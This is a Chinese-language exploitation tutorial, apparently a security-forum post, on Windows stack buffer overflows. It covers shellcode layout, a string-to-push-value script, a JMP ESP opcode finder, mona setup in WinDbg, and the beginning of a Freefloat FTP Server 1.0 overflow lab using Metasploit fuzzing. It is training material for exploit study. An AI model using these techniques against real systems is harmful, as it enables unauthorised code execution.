
该程序可通过在`password.txt`中填充shellcode，通过OD动态调试发现`buffer`缓冲区之后存放了函数返回地址，只要再把该地址覆盖成shellcode的入口地址就能执行shellcode。

### 1.2.2 规划缓冲区

在填充shellcode的时候还要合理规划缓冲区，此处shellcode填充在返回地址之前，导致shellcode的大小被限制在44，所以shellcode可以填充在函数返回地址之后。缓冲区中被放的数据可以有以下几种：

1. 填充物：一般是`nop`指令，函数返回地址只要落在该范围内就能顺序到达shellcode位置。

2. 被覆盖的返回地址：可以是shellcode入口地址、跳转指令地址、近似到shellcode的nop填充物地址。

3. shellcode机器码

摆放方式：

![](https://bbs.kanxue.com/upload/attach/202001/860174_2Z8ENRN82UYBXND.jpg)

### 1.3 字符串转16进制脚本

- `str_to_little_endian.py`

  溢出中的shellcode通常把静态数据（例如字符串）存储到栈中，例如存储“techliu”到栈中：

  ```
  xor ebx, ebx

  push ebx

  push 0x0075696C

  push 0x68636574
  ```

  这是根据栈的存储特性以及小端序特性写入到内存中的，这样在内容中就能看到'techliu'的字符串，前两行是将字符串结束符NULL入栈，但是不能直接`push 0`，因为可能会发生shellcode截断。

  而且`push`只能操作DWORD大小的数据，所以需要对字符串进行切分入栈。

  在py脚本后直接跟转化的字符串即可，生成的16进制从下到上依次入栈。

  脚本内容：

  ```
  import struct

  import sys

  BLOCK = 4

  if __name__ == '__main__':

    des_str = sys.argv[1]

    if not des_str:

        print("Not argv[1]!")

        exit(0)

    if isinstance(des_str, str):

        des_str = des_str.encode()

    # str_len = len(des_str);

    start = 0;

    while True:

        try:

            cur_str = des_str[start:start+4].ljust(4, b'\0')

            if cur_str == b'\0\0\0\0':

                break

            hex_str = cur_str.hex()

            int_str = int(hex_str,16)

            pack_str = struct.pack(b'<l', int_str)

            print("%4s:\t0x%s" % (cur_str.strip(b'\0').decode(), pack_str.hex().upper()))

            start = start + 4

        except:

            print("Error!!")

            exit(0)
  ```

> 注：字符串长度如果不是4的倍数，会被填充00，在目标程序读到此处的时候可能会发生00截断，根据目标程序获取exp内容的方式可能还会有其他截断，例如利用`fscanf`或`scanf`等，空格(ascii：20)也能截断字符串。

### 1.4 几种技巧

#### 1.4.1 跳板技术

程序每次运行后在内存中的指令地址都是变化的，所以shellcode入口地址也是动态的，所以为了能够动态找到shellcode的位置，引入了跳板技术。如图所示，左边表示存储返回地址的栈帧填充为shellcode入口地址，这种方式下次运行时入口地址将发生变化导致失败，右边表示跳板技术后，通过`esp`来定位shellcode，这种方式可保证下次运行exp依然有效。

![](https://bbs.kanxue.com/upload/attach/202001/860174_EV83Z6RUGAC5YCN.jpg)

跳板技术是用来动态跳转shellcode的，shellcode代码需要从函数返回后`esp`的栈顶位置开始，然后函数返回到`JMP ESP`指令处，指令执行后跳到`esp`位置进入shellcode入口。

> 注: 对于不同的返回指令的不同，函数返回后`esp`的指向也有所不同。一般执行`ret`指令后`esp+4`，此时shellcode放在存放返回地址的栈帧的下一位置。若是`ret N`指令，执行后`esp+4+N`，则shellcode需要放在计算出的对应位置处才行。

`JMP ESP`指令的地址要已知，在xp中`JMP ESP`可以通过加载`kernel32.dll`、`user32.dll`、`mfc32.dll`等这些经常被加载到内存中的库中寻找，一般地址都是确定的。

利用C实现查找代码如下：

```
# include <stdio.h>

#include <windows.h>

main()

{

    HINSTANCE hLib;

    hLib = LoadLibrary("user32.dll");

    if(!hLib)

    {

        printf("Load dll error!\n");

        exit(0);

    }

    byte* ptr = (byte*) hLib;

    int address;

    int position;

    bool done_flag = false;

    for(position=0; !done_flag; position++)

    {

        try

        {

            if(ptr[position] == 0xFF && ptr[position+1] == 0xE4)

            {

             // jmp esp 的机器码 为 0xFFE4

                address = (int)ptr + position;

                printf("Find OPcode at 0x%08lX\n", address);

            }

        }

        catch(...)

        {

            address = (int)ptr + position;

            printf("End of 0x%08lX\n", address);

            done_flag = true;

        }

    }

}
```

如果在现在的系统版本上实验，这个程序就失效了，因为WIN7以后, 几个核心dll都是使用浮动地址加载的。

#### 1.4.2 抬高栈顶保护shellcode

如果shellcode放在返回地址栈帧之前，那么在函数返回后栈顶位置会在shellcode下方，虽然出栈后的数据不被清空，但是却会受入栈操作的影响，所以shellcode中若存在`push`操作，很有可能破坏shellcode结构：

![](https://bbs.kanxue.com/upload/attach/202001/860174_NUY7NQA3DZYKR2A.jpg)

所以要在shellcode开头适当先抬高栈顶让shellcode在栈顶下方，这样`push`就不会影响shellcode。

抬高栈顶可以用`sub esp, N`，N大于shellcode长度即可。

![](https://bbs.kanxue.com/upload/attach/202001/860174_A9G8GTPWYBGX6DE.jpg)

[缺失，略过一部分]

## 二、windbg配置mona

### 2.1 参考

[105K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6U0L8%4u0W2L8r3q4F1i4K6u0r3N6$3W2F1k6r3u0Y4L8r3W2T1](https://bbs.kanxue.com/elink@f7cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6U0L8%4u0W2L8r3q4F1i4K6u0r3N6$3W2F1k6r3u0Y4L8r3W2T1)

[fdaK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6U0L8%4u0W2L8r3q4F1i4K6u0r3L8h3!0F1j5b7`.`.](https://bbs.kanxue.com/elink@a7eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6U0L8%4u0W2L8r3q4F1i4K6u0r3L8h3!0F1j5b7`.`.)

### 2.2 配置符号路径

新建文件夹，缓存符号，如`c:\localsymbols`

然后，写入符号路径：

```
SRV*c:\localsymbols*2b7K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3#2K6k6r3I4Q4x3X3g2E0K9h3y4J5L8%4y4G2k6Y4c8Q4x3X3g2U0L8$3#2Q4x3V1k6V1L8%4N6F1L8r3!0S2k6q4)9J5c8Y4y4&6L8h3u0G2L8s2x3`.
```

选择`reload`才能立即生效。

### 2.3 安装python

安装python后才能载入`pykd.pyd`

python版本要和mona版本一致

```
pip install pykd
```

### 2.4 配置windbg

将`pykd.pyd`放入windbg的`winext`中，`mona.py`和`windbglib.py`放入windgb根目录。

cmd中执行，

```
c:

cd "C:\Program Files (x86)\Common Files\Microsoft Shared\VC"

regsvr32 msdia90.dll

(You should get a messagebox indicating that the dll was registered successfully)
```

根据x64和x86作出相应改变。

用windgb随便打开一个pe文件，然后进入命令行，输入`.load pykd.pyd`，然后输入`!py mona`，尝试mona运行效果。

### 2.5 常用mona命令

#### 2.5.1 显示载入的模块

```
!py mona modules
```

#### 2.5.2 查找机器码

如`jmp esp`指令。

```
!py mona.py find -s "\xff\xe4"  -m
```

生成fuzzing模式串

```
# 300为模式串长度

!py mona.py pattern_create 300
```

EIP被模式串覆盖之后，查询模式串偏移

```
# 0x41424345为由模式串造成的异常值

!py mona.py pattern_offset 0x41424345
```

还可以这样查询偏移

```
!py mona.py find_msp
```

### 2.6 在Immunity Debugger中使用mona

将`mona.py`复制到Immunity Debugger下的`PyCommands`中，打开Immunity Debugger，输入命令`!mona help`试用。

## 三、Freefloat FTP Server 1.0 溢出漏洞分析

### 3.1 简介

这是一道exploit-db中的简单题目，溢出漏洞入门用。

### 3.2 参考

- [Part 2: Saved Return Pointer Overflows](https://bbs.kanxue.com/elink@3e3K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3k6#2P5Y4A6&6M7$3g2U0N6i4u0A6N6s2W2Q4x3X3g2U0L8$3#2Q4x3V1k6@1N6i4c8G2M7X3W2S2L8s2y4Q4x3V1k6W2P5s2m8p5k6i4k6Q4x3V1j5J5i4K6u0W2K9s2c8E0L8l9`.`.)

- [[翻译]Windows Exploit开发系列教程第二部分：Saved Return Pointer Overflows](https://bbs.pediy.com/thread-206858.htm)

- [Freefloat FTP Server 1.0 溢出漏洞分析](https://bbs.kanxue.com/elink@86fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4f1H3x3e0t1%4y4U0x3%4z5e0c8Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8U0f1K6x3U0V1I4y4K6R3^5)

- [FreeFloat FTP1.0 溢出漏洞分析](https://bbs.kanxue.com/elink@9f2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5P5W2)9J5k6h3q4D9K9i4W2#2L8W2)9J5k6h3y4G2L8g2)9J5c8Y4c8Q4x3V1j5J5x3o6t1%4)

- [Buffer Overflows Exploits](https://bbs.kanxue.com/elink@886K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6G2M7$3y4H3i4K6u0W2j5Y4u0#2N6r3g2X3x3s2u0U0k6g2)9J5k6h3y4G2L8g2)9J5c8X3u0#2k6X3k6W2M7W2)9J5k6r3!0$3k6i4u0X3L8r3!0%4M7#2)9J5k6r3g2^5M7r3I4G2K9i4c8K6)

### 3.3 分析工具

1. mona [[项目主页](https://bbs.kanxue.com/elink@c22K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6U0L8%4u0W2L8r3q4F1i4K6u0r3L8h3!0F1j5b7`.`.)]

2. Immunity Debugger [[主页](https://bbs.kanxue.com/elink@defK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2A6L8h3#2#2L8X3W2@1P5h3W2F1j5#2)9J5k6h3y4G2L8g2)9J5c8Y4m8J5L8$3c8#2j5%4c8K6i4K6u0r3k6r3g2T1N6h3N6Y4k6i4u0Q4x3V1j5`.)]

3. IDA 7.0 x86

4. win7 x64

5. kali 2.0 (主要用msf工具)

6. FTPServer.exe 1.0 [[主页](https://bbs.kanxue.com/elink@630K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3M7X3g2W2k6X3I4G2j5i4c8Q4x3X3c8X3N6s2m8Q4x3X3c8K6k6i4u0$3k6i4u0Q4x3X3g2S2M7s2m8G2L8X3W2U0i4K6u0W2j5$3!0E0i4K6u0r3)]

7. python 2.7

### 3.4 Start

#### 3.4.1 fuzzing

我试了两种方式，道理一样。

##### 3.4.1.1 msf方式

打开`msfconsole`，如果报错

![](https://bbs.kanxue.com/upload/attach/202001/860174_SXH82FKN4DGFKPS.jpg)

则可能是`postgresql`数据库没有启动，

![](https://bbs.kanxue.com/upload/attach/202001/860174_A3P76PC8WV8UTES.jpg)

先启动一下。命令`systemctl start postgresql`。

然后进入`msfconsole`不报错了就行。

首先搜一下ftp fuzzing的模块，命令`search fuzzing`

![](https://bbs.kanxue.com/upload/attach/202001/860174_Z6Z7QBWBVM4SSRB.jpg)

就用`auxiliary/fuzzers/ftp/ftp_pre_post` ，命令`use auxiliary/fuzzers/ftp/ftp_pre_post`

输入`info`查看信息，`RHOST`填入即可

```
# 加载模块

use auxiliary/fuzzers/ftp/ftp_pre_post

# 设置远程ftp地址

set RHOST 192.168.80.128

# 开始利用

exploit
```
